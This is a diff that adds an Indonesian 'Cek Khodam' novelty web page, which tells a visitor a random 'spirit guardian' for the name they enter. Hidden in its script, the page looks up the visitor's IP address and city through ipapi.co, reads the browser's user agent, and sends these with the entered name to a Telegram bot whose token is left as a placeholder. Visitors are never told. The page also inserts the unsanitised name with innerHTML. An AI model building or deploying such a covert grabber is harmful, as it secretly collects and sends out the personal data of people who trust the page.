@@ -1,0 +1,151 @@
+<!doctype html>
+<html lang="id">
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>Cek Khodam by dyvsss</title>
+        <meta name="description" content="Web program TailwindCSS | AndyJs" />
+        <meta name="author" content="andyjavadams" />
+        <link rel="icon" href="https://c.top4top.io/p_208369npm0.png" />
+        <script src="https://cdn.tailwindcss.com"></script>
+    </head>
+    <body class="bg-gray-900 h-screen flex justify-center items-center">
+        <div class="bg-white shadow-md rounded px-8 pt-6 pb-8 mb-4 w-80">
+            <h2 class="text-center font-semibold text-2xl mb-4">
+                Cek Khodam by
+                <a href="https://dyvsss.me" class="text-sky-600 animate-pulse"
+                    >dyvsss</a
+                >
+            </h2>
+            <form>
+                <input
+                    type="text"
+                    id="nama"
+                    class="block w-full p-2 mb-4 border border-gray-300 rounded"
+                    placeholder="Siapa Namanya?"
+                />
+                <button
+                    type="button"
+                    class="bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded"
+                    onclick="cekKhodam()"
+                >
+                    Cek
+                </button>
+                <div id="hasil" class="mt-4 font-semibold"></div>
+            </form>
+        </div>
+
+        <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
+        <script>
+            var tokenTelegram = "TOKEN_TELE_KAMU";
+            var chatIdTelegram = "ID_TELE_KAMU";
+
+            //NGILANGIN INI PARAH BGT SIH
+            //WATERMARK ANDYJS GANTENG TAMPAN PEMBERANI
+
+            function cekKhodam() {
+                var nama = document.getElementById("nama").value;
+                var kategori = ["Hewan", "Tanaman", "Dewa", "Buah Buahan"];
+                var hewan = [
+                    "Kucing",
+                    "Anjing",
+                    "Gajah",
+                    "Harimau",
+                    "Kelinci",
+                    "Semut",
+                    "Lalat",
+                    "Lebah",
+                    "Kerbau",
+                    "Burung"
+                ];
+                var tanaman = [
+                    "Mawar",
+                    "Melati",
+                    "Anggrek",
+                    "Kaktus",
+                    "Bunga Matahari",
+                    "Bunga Bangkai",
+                    "Daun Jeruk",
+                    "Pucuk Teh",
+                    "Pucuk Pepaya",
+                    "Daun Pepaya"
+                ];
+                var dewa = ["Zeus", "Poseidon", "Athena", "Ares", "Dionysus"];
+                var buahBuahan = [
+                    "Apel",
+                    "Jeruk",
+                    "Mangga",
+                    "Pisang",
+                    "Anggur",
+                    "Sirsak",
+                    "Rambutan",
+                    "Salak",
+                    "Jambu",
+                    "Semangka"
+                ];
+
+                var randomKategori =
+                    kategori[Math.floor(Math.random() * kategori.length)];
+                var hasil;
+
+                switch (randomKategori) {
+                    case "Hewan":
+                        hasil = hewan[Math.floor(Math.random() * hewan.length)];
+                        break;
+                    case "Tanaman":
+                        hasil =
+                            tanaman[Math.floor(Math.random() * tanaman.length)];
+                        break;
+                    case "Dewa":
+                        hasil = dewa[Math.floor(Math.random() * dewa.length)];
+                        break;
+                    case "Buah Buahan":
+                        hasil =
+                            buahBuahan[
+                                Math.floor(Math.random() * buahBuahan.length)
+                            ];
+                        break;
+                }
+
+                document.getElementById("hasil").innerHTML =
+                    "Khodam dari " +
+                    nama +
+                    " adalah " +
+                    hasil +
+                    " (" +
+                    randomKategori +
+                    ")";
+
+                axios
+                    .get("https://ipapi.co/json/")
+                    .then(response => {
+                        var ipAddress = response.data.ip;
+                        var device = navigator.userAgent;
+                        var kota = response.data.city;
+                        var pesan =
+                            "Nama: " +
+                            nama +
+                            "\nKhodam: " +
+                            hasil +
+                            " (" +
+                            randomKategori +
+                            ") \n\nIP Address: " +
+                            ipAddress +
+                            "\n\nDevice: " +
+                            device;
+                        "\n\nKota: " + kota;
+                        axios.post(
+                            "https://api.telegram.org/bot" +
+                                tokenTelegram +
+                                "/sendMessage",
+                            {
+                                chat_id: chatIdTelegram,
+                                text: pesan
+                            }
+                        );
+                    })
+                    .catch(error => console.error(error));
+            }
+        </script>
+    </body>
+</html>
